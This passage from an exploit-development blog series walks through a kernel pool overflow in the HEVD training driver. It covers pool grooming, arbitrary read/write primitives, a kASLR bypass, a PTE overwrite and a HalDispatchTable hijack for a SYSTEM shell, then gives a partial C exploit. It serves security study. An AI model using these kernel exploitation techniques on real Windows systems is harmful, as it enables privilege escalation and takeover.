Recall earlier the sentiment about needing to preserve `_POOL_HEADER` structures? This is where everything goes full circle for us. Recall from Part 1 that the kLFH _still_ uses the legacy `_POOL_HEADER` structures to process and store metadata for pool chunks. This means there is no encoding going on, and it is possible to hardcode the header into the exploit so that when the pool overflow occurs we can make sure when the header is overwritten it is overwritten with the same content as before.

Let's inspect the value of a `_POOL_HEADER` of a `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, which we would be overflowing into.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool49.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool50.png" alt="">

Since this chunk is 16 bytes and will be part of the kLFH, it is prepended with a standard `_POOL_HEADER` structure. Since this is the case, and there is no encoding, we can simply hardcode the value of the `_POOL_HEADER` (recall that the `_POOL_HEADER` will be `0x10` bytes before the value returned by `ExAllocatePoolWithTag`). This means we can hardcode the value `0x6b63614802020000` into our exploit so that at the time of the overflow into the next chunk, which should be into one of these `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` objects we have previously sprayed, the first `0x10` bytes that are overflown of this chunk, which will be the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`'s `_POOL_HEADER`, will be preserved and kept as valid, bypassing the earlier issue shown when an invalid header occurs.

Knowing this, and knowing we have a bit of work to do, let's rearrange our current exploit to make it more logical. We will create three functions for grooming:
1. `fillHoles()`
2. `groomPool()`
3. `pokeHoles()`

These functions can be seen below.

`fillHoles()`

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool51.png" alt="">

`groomPool()`

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool52.png" alt="">

`pokeHoles()`

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool53.png" alt="">

Please refer to Part 1 to understand what this is doing, but essentially this technique will fill any fragments in the corresponding kLFH bucket in the `NonPagedPoolNx` and force the memory manager to (theoretically) give us a new page to work with. We then fill this new page with objects we control, e.g. the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` objects

Since we have a controlled pool-based overflow, the goal will be to overwrite any of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` structures with the "vulnerable chunk" that copies memory into the allocation, without any bounds checking. Since the vulnerable chunk and the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` chunks are of the same size, they will both wind up being adjacent to each other theoretically, since they will land in the same kLFH bucket.

The last function, called `readwritePrimitive()` contains most of the exploit code.

The first bit of this function creates a "main" `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` via an `ARW_HELPER_OBJECT_IO` object, and performs the filling of the pool chunks, fills the new page with objects we control, and then frees every other one of these objects.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool55.png" alt="">

After freeing every other object, we then replace these freed slots with our vulnerable buffers. We also create a "standalone/main" `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object. Also note that the pool header is 16 bytes in size, meaning it is 2 QWORDS, hence "Padding".

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool55.png" alt="">

What we actually hope to do here, is the following.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool56.png" alt="">

We want to use a controlled write to only overwrite the first member of this adjacent `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, `Name`. This is because we have additional primitives to control and return these values of the `Name` member as shown in this blog post. The issue we have had so far, however, is the address of the `Name` member of a `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object is completely controlled by the driver and cannot be influenced by us, unless we leverage a vulnerability (a la pool overflow).

As shown in the `readwritePrimitive()` function, the goal here will be to actually corrupt the adjacent chunk(s) with the address of the "main" `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, which we will manage via `ARW_HELPER_OBJECT_IO.HelperObjectAddress`. We would like to corrupt the adjacent `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object with a precise overflow to corrupt the `Name` value with the address of our "main" object. Currently this value is set to `0x9090909090909090`. Once we prove this is possible, we can then take this further to obtain the eventual read/write primitive.

Setting a breakpoint on the `TriggerBufferOverflowNonPagedPoolNx` routine in `HEVD.sys`, and setting an additional breakpoint on the `memcpy` routine, which performs the pool overflow, we can investigate the contents of the pool.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool57.png" alt="">

As seen in the above image, we can clearly see we have flooded the pool with controlled `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` objects, as well as the "current" chunk - which refers to the vulnerable chunk used in the pool overflow. All of these chunks are prefaced with the `Hack` tag.

Then, after stepping through execution until the `mempcy` routine, we can inspect the contents of the next chunk, which is `0x10` bytes _after_ the value in RCX, which is used in the destination for the memory copy operation. Remember - our goal is to overwrite the adjacent pool chunks. Stepping through the operation to clearly see that we have corrupted the next pool chunk, which is of type `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool58.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool59.png" alt="">

We can validate that the address which was written out-of-bounds is actually the address of the "main", standalone `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object we created.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool60.png" alt="">

Remember - a `_POOL_HEADER` structure is `0x10` bytes in length. This makes every pool chunk within this kLFH bucket `0x20` bytes in total size. Since we want to overflow adjacent chunks, we need to preserve the pool header. Since we are in the kLFH, we can just hardcode the pool header, as we have proven, to satisfy the pool and to avoid any crashes which may arise as a result of an invalid pool chunk. Additionally, we can corrupt the first `0x10` bytes of the value in RCX, which is the destination address in the memory copy operation, because there are `0x20` bytes in the "vulnerable" pool chunk (which is used in the copy operation). The first `0x10` bytes are the header and the second half we actually don't care about, as we are worried about corrupting an adjacent chunk. Because of this, we can set the first `0x10` bytes of our copy, which writes out of bounds, to `0x10` to ensure that the bytes which are copied out of bounds are the bytes that comprise the pool header of the _next_ chunk.

We have now successfully performed out out-of-bounds write via a pool overflow, and have corrupted an adjacent `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object's `Name` member, which is dynamically allocated on the pool before had and has an address we do not control, unless we use a vulnerability such as an out-of-bounds write, with an address we _do_ control, which is the address of the object created previously.

Arbitrary Read Primitive
---

Although it may not be totally apparent currently, our exploit strategy revolves around our ability to use our pool overflow to write out-of-bounds. Recall that the "Set" and "Get" capabilities in the driver allow us to read and write memory, but not at controlled locations. The location is controlled by the pool chunk allocated for the `Name` member of an `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`.

Let's take a look at the corrupted `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object. The corrupted object is one of the many sprayed objects. We successfully overwrote the `Name` member of this object with the address of the "main", or standalone `ARE_HELPER_OBJECT_NON_PAGED_POOL_NX` object.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool61.png" alt="">

We know that it is possible to set the `Name` member of an `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` structure via the `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function through an IOCTL invocation. Since we are now able to control the value of `Name` in the corrupted object, let's see if we can't abuse this through an arbitrary read primitive.

Let's break this down. We know that we currently have a corrupted object with a `Name` member that is set to the value of _another_ object. For brevity, we can recall this from the previous image.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool61.png" alt="">

If we do a "Set" operation currently on the _corrupted_ object, shown in the `dt` command and currently has its `Name` member set to `0xffffa00ca378c210`, it will perform this operation on the `Name` member. However, we know that the `Name` member is actually currently set to the value of the "main" object via the out-of-bounds write! This means that performing a "Set" operation on the corrupted object will actually take the address of the main object, since it is set in the `Name` member, dereference it, and write the contents specified by us. This will cause our main object to then point to whatever we specify, instead of the value of `ffffa00ca378c3b0` currently outlined in the memory contents shown by `dq` in WinDbg. How does this turn into an arbitrary read primitive? Since our "main" object will point to whatever address we specify, the "Get" operation, if performed on the "main" object, will then _dereference_ this address specified by us and return the value!

In WinDbg, we can "mimic" the "Set" operation as shown.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool62.png" alt="">

Performing the "Set" operation on the corrupted object will actually set the value of our main object to whatever is specified to the user, due to us corrupting the previous random address with the pool overflow vulnerability. At this point, performing the "Get" operation on our main object, since it was set to the value specified by the user, would dereference the value and return it to us!

At this point we need to identify what out goal is. To comprehensively bypass kASLR, our goal is as follows:

1. Use the base address of `HEVD.sys` from the original exploit in [part one]() to provide the offset to the Import Address Table
2. Supply an IAT entry that points to `ntoskrnl.exe` to the exploit to be arbitrarily read from (thus obtaining a pointer to `ntoskrnl.exe`)
3. Calculate the distance from the pointer to the kernel to obtain the base

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool63.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool64.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool65.png" alt="">

We can update our code to outline this. As you may recall, we have groomed the pool with 5000 `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` objects. However, we did not spray the pool with 5000 "vulnerable" objects. Since we have groomed the pool, we know that our vulnerable object we can arbitrarily write past will end up adjacent to one of the objects used for grooming. Since we only trigger the overflow once, and since we have already set `Name` values on all of the objects used for grooming, a value of `0x9090909090909090`, we can simply use the "Get" operation in order to view each `Name` member of the objects used for grooming. If one of the objects _does not_ contain NOPs, this is indicative that the pool overflow outlined previously to corrupt the `Name` value of an `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` has succeeded.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool66.png" alt="">

After this, we can then use the same primitive previously mentioned about now using the "Set" functionality in HEVD to set the `Name` member of the targeted corrupted object, which would actually "trick" the program to overwrite the `Name` member of the corrupted object, which is actually the address of the "standalone"/main `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`. The overwrite will dereference the standalone object, thus allowing for an arbitrary read primitive since we have the ability to then later use the "Get" functionality on the main object later.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool67.png" alt="">

We then can add a "press enter to continue" function to our exploit to pause execution after the main object is printed to the screen, as well as the corrupted object used for grooming that resides within the 5000 objects used for grooming.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool68.png" alt="">

We then can take the address `0xffff8e03c8d5c2b0`, which is the corrupted object, and inspect it in WinDbg. If all goes well, this address _should_ contain the address of the "main" object.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool69.png" alt="">

Comparing the `Name` member to the previous screenshot in which the exploit with the "press enter to continue" statement is in, we can see that the pool corruption was successful and that the `Name` member of one of the 5000 objects used for grooming was overwritten!

Now, if we were to use the "Set" functionality of HEVD and supply the `ARW_HELPER_OBJECT_NON_PAGED_POOL` object that was corrupted and also used for grooming, at address `0xffff8e03c8d5c2b0`, HEVD would use the value stored in `Name`, dereference it, and overwrite it. This is because HEVD is expecting one of the pool allocations previously showcased for `Name` pointers, which we do not control. Since we have supplied another address, what HEVD will actually do is perform the overwite, but this time it will overwrite the pointer we supplied, which is another `ARW_HELPER_OBJECT_NON_PAGED_POOL`. Since the first member of one of these objects has a member `Name`, what will happen is that HEVD will actually write whatever we supply to the `Name` member of our main object! Let's view this in WinDbg.

As our exploit showcased, we are using `HEVD+0x2038` in this case. This value should be written to our main object.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool70.png" alt="">

As you can see, our main object now has its `Name` member pointing to `HEVD+0x2038`, which is a pointer to the kernel! After running the full exploit, we have now obtained the base address of HEVD from the previous exploit, and now the base of the kernel via an arbitrary read by way of pool overflow - all from low integrity!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool71.png" alt="">

The beauty of this technique of leveraging two objects should be clear now - we do not have to constantly perform overflows of objects in order to perform exploitation. We can now just simply use the main object to read!

Our exploitation technique will be to corrupt the page table entries of our eventual memory page our shellcode resides in. If you are not familiar with this technique, I have two blogs written on the subject, plus one about memory paging. You can find them here: [one](https://connormcgarr.github.io/paging/), [two](https://connormcgarr.github.io/cve-2020-21551-sploit/), and [three](https://connormcgarr.github.io/pte-overwrites/).

For our purposes, we will need to following items arbitrarily read:

1. `nt!MiGetPteAddress+0x13` - this contains the base of the PTEs needed for calculations
2. PTE bits that make up the shellcode page
3. `[nt!HalDispatchTable+0x8]` - used to execute our shellcode. We first need to preserve this address by reading it to ensure exploit stability

Let's add a routine to address the first issue, reading the base of the page table entries. We can calculate the offset to the function `MiGetPteAddress+0x13` and then use our arbitrary read primitive.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool72.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool73.png" alt="">

Leveraging the exact same method as before, we can see we have defeated page table randomization and have the base of the page table entries in hand!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool74.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool75.png" alt="">

The next step is to obtain the PTE bits that make up the shellcode page. We will eventually write our shellcode to `KUSER_SHARED_DATA+0x800` in kernel mode, which is at a static address of `0xfffff87000000800`. We can instrument the routine to obtain this information in C.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool76.png" alt="">

After running the updated exploit, we can see that we are able to leak the PTE bits for `KUSER_SHARED_DATA+0x800`, where our shellcode will eventually reside.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool77.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool78.png" alt="">

Note that the `!pte` extension in WinDbg was giving myself trouble. So, from the debuggee machine, I ran WinDbg "classic" with local kernel debugging (lkd) to show the contents of `!pte`. Notice the actual virtual address for the PTE has changed, but the contents of the PTE bits are the same. This is due to myself rebooting the machine and kASLR kicking in. The WinDbg "classic" screenshot is meant to just outline the PTE contents.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool78a.png" alt="">

You can view [this previous blog](https://connormcgarr.github.io/pte-overwrites/)) from myself to understand the permissions `KUSER_SHARED_DATA` has, which is write but no execute. The last item we need is the contents of `[nt!HalDispatchTable]`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool79.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool80.png" alt="">

After executing the updated code, we can see we have preserved the value `[nt!HalDispatchTable+0x8]`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool81.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool82.png" alt="">

The last item on the agenda is the write primitive, which is 99 percent identical to the read primitive. After writing our shellcode to kernel mode and then corrupting the PTE of the shellcode page, we will be able to successfully escalate our privileges.

Arbitrary Write Primitive
---

Leveraging the same concepts from the arbitrary read primitive, we can also arbitrarily overwrite 64-bit pointers! Instead of using the "Get" operation in order to fetch the dereferenced contents of the `Name` value specified by the "corrupted" `ARW_HELPER_NON_PAGED_POOL_NX` object, and then returning this value to the `Name` value specified by the "main" object, this time we will set the `Name` value of the "main" object not to a pointer that receives the contents, but to the value of what we would like to overwrite memory with. In this case, we want to set this value to the value of shellcode, and then set the `Name` value of the "corrupted" object to `KUSER_SHARED_DATA+0x800` incrementally.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool83.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool84.png" alt="">

From here we can run our updated exploit. Since we have created a loop to automate the writing process, we can see we are able to arbitrarily write the contents of the 9 QWORDS which make up our shellcode to `KUSER_SHARED_DATA+0x800`!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool85.png" alt="">

Awesome! We have now successfully performed the arbitrary write primitive! The next goal is to corrupt the contents of the PTE for the `KUSER_SHARED_DATA+0x800` page. 

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool86.png" alt="">

From here we can use WinDbg classic to inspect the PTE before _and after_ the write operation.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool87.png" alt="">

Awesome! Our exploit now just needs three more things: 

1. Corrupt `[nt!HalDispatchTable+0x8]` to point to `KUSER_SHARED_DATA+0x800`
2. Invoke `ntdll!NtQueryIntervalPRofile`, which will perform the transition to kernel mode to invoke `[nt!HalDispatchTable+0x8]`, thus executing our shellcode
3. Restore `[nt!HalDispatchTable+0x8]` with the arbitrary write primitive

Let's update our exploit code to perform step one.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool88.png" alt="">

After executing the updated code, we can see that we have successfully overwritten `nt!HalDispatchTable+0x8` with the address of `KUSER_SHARED_DATA+0x800` - which contains our shellcode!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool89.png" alt="">

Next, we can add the routing to dynamically resolve `ntdll!NtQueryIntervalProfile`, invoke it, and then restore `[nt!HalDispatchTable+0x8]`

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool90.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool91.png" alt="">

The final result is a `SYSTEM` shell from low integrity!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool92.gif" alt="">

"...Unless We Conquer, As Conquer We Must, As Conquer We Shall."
---
Hopefully you, as the reader, found this two-part series on pool corruption useful! As aforementioned in the beginning of this post, we must expect mitigations such as VBS and HVCI to be enabled in the future. ROP is still a viable alternative in the kernel due to the lack of kernel CET (kCET) at the moment (although I am sure this is subject to change). As such, techniques such as the one outlined in this blog post will soon be deprecated, leaving us with fewer options for exploitation than which we started. Data-only attacks are always viable, and there have been more novel techniques mentioned, such as [this tweet](https://twitter.com/d_olex/status/1393264600515153921?s=20) sent to myself by Dmytro, which talks about leveraging ROP to forge kernel function calls even with VBS/HVCI enabled. As the title of this last section of the blog articulates, where there is a will there is a way - and although the bar will be raised, this is only par for the course with exploit development over the past few years. KPP + VBS + HVCI + kCFG/kXFG + SMEP + DEP + kASLR + kCET and many other mitigations will prove very useful for blocking most exploits. I hope that researchers stay hungry and continue to push the limits with this mitigations to find more novel ways to keep exploit development alive!

Peace, love, and positivity :-).

Here is the final exploit code, which is also available on my GitHub:

```c
// HackSysExtreme Vulnerable Driver: Pool Overflow + Memory Disclosure
// Author: Connor McGarr (@33y0re)

#include <windows.h>
#include <stdio.h>

// typdef an ARW_HELPER_OBJECT_IO struct
typedef struct _ARW_HELPER_OBJECT_IO
{
    PVOID HelperObjectAddress;
    PVOID Name;
    SIZE_T Length;
} ARW_HELPER_OBJECT_IO, * PARW_HELPER_OBJECT_IO;

// Create a global array of ARW_HELPER_OBJECT_IO objects to manage the groomed pool allocations
ARW_HELPER_OBJECT_IO helperobjectArray[5000] = { 0 };

// Prepping call to nt!NtQueryIntervalProfile
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

// Leak the base of HEVD.sys
unsigned long long memLeak(HANDLE driverHandle)
{
    // Array to manage handles opened by CreateEventA
    HANDLE eventObjects[5000];

    // Spray 5000 objects to fill the new page
    for (int i = 0; i <= 5000; i++)
    {
        // Create the objects
        HANDLE tempHandle = CreateEventA(
            NULL,
            FALSE,
            FALSE,
            NULL
        );

        // Assign the handles to the array
        eventObjects[i] = tempHandle;
    }

    // Check to see if the first handle is a valid handle
    if (eventObjects[0] == NULL)
    {
        printf("[-] Error! Unable to spray CreateEventA objects! Error: 0x%lx\n", GetLastError());

        return 0x1;
        exit(-1);
    }
    else
    {
        printf("[+] Sprayed CreateEventA objects to fill holes of size 0x80!\n");

        // Close half of the handles
        for (int i = 0; i <= 5000; i += 2)
        {
            BOOL tempHandle1 = CloseHandle(
                eventObjects[i]
            );

            eventObjects[i] = NULL;

            // Error handling
            if (!tempHandle1)
            {
                printf("[-] Error! Unable to free the CreateEventA objects! Error: 0x%lx\n", GetLastError());

                return 0x1;
                exit(-1);
            }
        }

        printf("[+] Poked holes in the new pool page!\n");

        // Allocate UaF Objects in place of the poked holes by just invoking the IOCTL, which will call ExAllocatePoolWithTag for a UAF object
        // kLFH should automatically fill the freed holes with the UAF objects
        DWORD bytesReturned;

        for (int i = 0; i < 2500; i++)
        {
            DeviceIoControl(
                driverHandle,
                0x00222053,
                NULL,
                0,
                NULL,
                0,
                &bytesReturned,
                NULL
            );
        }

        printf("[+] Allocated objects containing a pointer to HEVD in place of the freed CreateEventA objects!\n");

        // Close the rest of the event objects
        for (int i = 1; i <= 5000; i += 2)
        {
            BOOL tempHandle2 = CloseHandle(
                eventObjects[i]
            );

            eventObjects[i] = NULL;

            // Error handling
            if (!tempHandle2)
            {
                printf("[-] Error! Unable to free the rest of the CreateEventA objects! Error: 0x%lx\n", GetLastError());

                return 0x1;
                exit(-1);
            }
        }

        // Array to store the buffer (output buffer for DeviceIoControl) and the base address
        unsigned long long outputBuffer[100];
        unsigned long long hevdBase = 0;

        // Everything is now, theoretically, [FREE, UAFOBJ, FREE, UAFOBJ, FREE, UAFOBJ], barring any more randomization from the kLFH
        // Fill some of the holes, but not all, with vulnerable chunks that can read out-of-bounds (we don't want to fill up all the way to avoid reading from a page that isn't mapped)

        for (int i = 0; i <= 100; i++)
        {
            // Return buffer
            DWORD bytesReturned1;

            DeviceIoControl(
                driverHandle,
                0x0022204f,
                NULL,
                0,
                &outputBuffer,
                sizeof(outputBuffer),
                &bytesReturned1,
                NULL
            );

        }

        printf("[+] Successfully triggered the out-of-bounds read!\n");

        // Parse the output
        for (int i = 0; i <= 100; i++)
        {
            // Kernel mode address?
            if ((outputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
            {
                printf("[+] Address of function pointer in HEVD.sys: 0x%llx\n", outputBuffer[i]);
                printf("[+] Base address of HEVD.sys: 0x%llx\n", outputBuffer[i] - 0x880CC);

                // Store the variable for future usage
                hevdBase = outputBuffer[i] - 0x880CC;

                // Return the value of the base of HEVD
                return hevdBase;
            }
        }
    }
}

// Function used to fill the holes in pool pages
void fillHoles(HANDLE driverHandle)
{
    // Instantiate an ARW_HELPER_OBJECT_IO
    ARW_HELPER_OBJECT_IO tempObject = { 0 };

    // Value to assign the Name member of each ARW_HELPER_OBJECT_IO
    unsigned long long nameValue = 0x9090909090909090;

    // Set the length to 0x8 so that the Name member of an ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object allocated in the pool has its Name member allocated to size 0x8, a 64-bit pointer size
    tempObject.Length = 0x8;

    // Bytes returned
    DWORD bytesreturnedFill;

    for (int i = 0; i <= 5000; i++)
    {
        // Set the Name value to 0x9090909090909090
        tempObject.Name = &nameValue;

        // Allocate a ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object with a Name member of size 0x8 and a Name value of 0x9090909090909090
        DeviceIoControl(
            driverHandle,
            0x00222063,
            &tempObject,
            sizeof(tempObject),
            &tempObject,
            sizeof(tempObject),
            &bytesreturnedFill,
            NULL
        );

        // Using non-controlled arbitrary write to set the Name member of the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object to 0x9090909090909090 via the Name member of each ARW_HELPER_OBJECT_IO
        // This will be used later on to filter out which ARW_HELPER_OBJECT_NON_PAGED_POOL_NX HAVE NOT been corrupted successfully (e.g. their Name member is 0x9090909090909090 still)
        DeviceIoControl(
            driverHandle,
            0x00222067,
            &tempObject,
            sizeof(tempObject),
            &tempObject,
            sizeof(tempObject),
            &bytesreturnedFill,
            NULL
        );

        // After allocating the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects (via the ARW_HELPER_OBJECT_IO objects), assign each ARW_HELPER_OBJECT_IO structures to the global managing array
        helperobjectArray[i] = tempObject;
    }

    printf("[+] Sprayed ARW_HELPER_OBJECT_IO objects to fill holes in the NonPagedPoolNx with ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects!\n");
}

// Fill up the new page within the NonPagedPoolNx with ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects
void groomPool(HANDLE driverHandle)
{
    // Instantiate an ARW_HELPER_OBJECT_IO
    ARW_HELPER_OBJECT_IO tempObject1 = { 0 };

    // Value to assign the Name member of each ARW_HELPER_OBJECT_IO
    unsigned long long nameValue1 = 0x9090909090909090;

    // Set the length to 0x8 so that the Name member of an ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object allocated in the pool has its Name member allocated to size 0x8, a 64-bit pointer size
    tempObject1.Length = 0x8;

    // Bytes returned
    DWORD bytesreturnedGroom;

    for (int i = 0; i <= 5000; i++)
    {
        // Set the Name value to 0x9090909090909090
        tempObject1.Name = &nameValue1;

        // Allocate a ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object with a Name member of size 0x8 and a Name value of 0x9090909090909090
        DeviceIoControl(
            driverHandle,
            0x00222063,
            &tempObject1,
            sizeof(tempObject1),
            &tempObject1,
            sizeof(tempObject1),
            &bytesreturnedGroom,
            NULL
        );

        // Using non-controlled arbitrary write to set the Name member of the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object to 0x9090909090909090 via the Name member of each ARW_HELPER_OBJECT_IO
        // This will be used later on to filter out which ARW_HELPER_OBJECT_NON_PAGED_POOL_NX HAVE NOT been corrupted successfully (e.g. their Name member is 0x9090909090909090 still)
        DeviceIoControl(
            driverHandle,
            0x00222067,
            &tempObject1,
            sizeof(tempObject1),
            &tempObject1,
            sizeof(tempObject1),
            &bytesreturnedGroom,
            NULL
        );

        // After allocating the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects (via the ARW_HELPER_OBJECT_IO objects), assign each ARW_HELPER_OBJECT_IO structures to the global managing array
        helperobjectArray[i] = tempObject1;
    }

    printf("[+] Filled the new page with ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects!\n");
}

// Free every other object in the global array to poke holes for the vulnerable objects
void pokeHoles(HANDLE driverHandle)
{
    // Bytes returned
    DWORD bytesreturnedPoke;

    // Free every other element in the global array managing objects in the new page from grooming
    for (int i = 0; i <= 5000; i += 2)
    {
        DeviceIoControl(
            driverHandle,
            0x0022206f,
            &helperobjectArray[i],
            sizeof(helperobjectArray[i]),
            &helperobjectArray[i],
            sizeof(helperobjectArray[i]),
            &bytesreturnedPoke,
            NULL
        );
    }

    printf("[+] Poked holes in the NonPagedPoolNx page containing the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects!\n");
}

// Create the main ARW_HELPER_OBJECT_IO
ARW_HELPER_OBJECT_IO createmainObject(HANDLE driverHandle)
{
    // Instantiate an object of type ARW_HELPER_OBJECT_IO
    ARW_HELPER_OBJECT_IO helperObject = { 0 };

    // Set the Length member which corresponds to the amount of memory used to allocate a chunk to store the Name member eventually
    helperObject.Length = 0x8;

    // Bytes returned
    DWORD bytesReturned2;

    // Invoke CreateArbitraryReadWriteHelperObjectNonPagedPoolNx to create the main ARW_HELPER_OBJECT_NON_PAGED_POOL_NX
    DeviceIoControl(
        driverHandle,
        0x00222063,
        &helperObject,
        sizeof(helperObject),
        &helperObject,
        sizeof(helperObject),
        &bytesReturned2,
        NULL
    );

    // Parse the output
    printf("[+] PARW_HELPER_OBJECT_IO->HelperObjectAddress: 0x%p\n", helperObject.HelperObjectAddress);
    printf("[+] PARW_HELPER_OBJECT_IO->Name: 0x%p\n", helperObject.Name);
    printf("[+] PARW_HELPER_OBJECT_IO->Length: 0x%zu\n", helperObject.Length);

    return helperObject;
}

// Read/write primitive
void readwritePrimitive(HANDLE driverHandle)
{
    // Store the value of the base of HEVD
    unsigned long long hevdBase = memLeak(driverHandle);

    // Store the main ARW_HELOPER_OBJECT
    ARW_HELPER_OBJECT_IO mainObject = createmainObject(driverHandle);

    // Fill the holes
    fillHoles(driverHandle);

    // Groom the pool
    groomPool(driverHandle);

    // Poke holes
    pokeHoles(driverHandle);

    // Use buffer overflow to take "main" ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object's Name value (managed by ARW_HELPER_OBJECT_IO.Name) to overwrite any of the groomed ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name values
    // Create a buffer that first fills up the vulnerable chunk of 0x10 (16) bytes
    unsigned long long vulnBuffer[5];
    vulnBuffer[0] = 0x4141414141414141;
    vulnBuffer[1] = 0x4141414141414141;

    // Hardcode the _POOL_HEADER value for a ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object
    vulnBuffer[2] = 0x6b63614802020000;

    // Padding
    vulnBuffer[3] = 0x4141414141414141;

    // Overwrite any of the adjacent ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object's Name member with the address of the "main" ARW_HELPER_OBJECT_NON_PAGED_POOL_NX (via ARW_HELPER_OBJECT_IO.HelperObjectAddress)
    vulnBuffer[4] = mainObject.HelperObjectAddress;

    // Bytes returned
    DWORD bytesreturnedOverflow;
    DWORD bytesreturnedreadPrimtitve;

    printf("[+] Triggering the out-of-bounds-write via pool overflow!\n");

    // Trigger the pool overflow
    DeviceIoControl(
        driverHandle,
        0x0022204b,
        &vulnBuffer,
        sizeof(vulnBuffer),
        &vulnBuffer,
        0x28,
        &bytesreturnedOverflow,
        NULL
    );

    // Find which "groomed" object was overflowed
    int index = 0;
    unsigned long long placeholder = 0x9090909090909090;

    // Loop through every groomed object to find out which Name member was overwritten with the main ARW_HELPER_NON_PAGED_POOL_NX object
    for (int i = 0; i <= 5000; i++)
    {
        // The placeholder variable will be overwritten. Get operation will overwrite this variable with the real contents of each object's Name member
        helperobjectArray[i].Name = &placeholder;

        DeviceIoControl(
            driverHandle,
            0x0022206b,
            &helperobjectArray[i],
            sizeof(helperobjectArray[i]),
            &helperobjectArray[i],
            sizeof(helperobjectArray[i]),
            &bytesreturnedreadPrimtitve,
            NULL
        );

        // Loop until a Name value other than the original NOPs is found
        if (placeholder != 0x9090909090909090)
        {
            printf("[+] Found the overflowed object overwritten with main ARW_HELPER_NON_PAGED_POOL_NX object!\n");
            printf("[+] PARW_HELPER_OBJECT_IO->HelperObjectAddress: 0x%p\n", helperobjectArray[i].HelperObjectAddress);

            // Assign the index
            index = i;

            printf("[+] Array index of global array managing groomed objects: %d\n", index);

            // Break the loop
            break;
        }
    }

    // IAT entry from HEVD.sys which points to nt!ExAllocatePoolWithTag
    unsigned long long ntiatLeak = hevdBase + 0x2038;

    // Print update
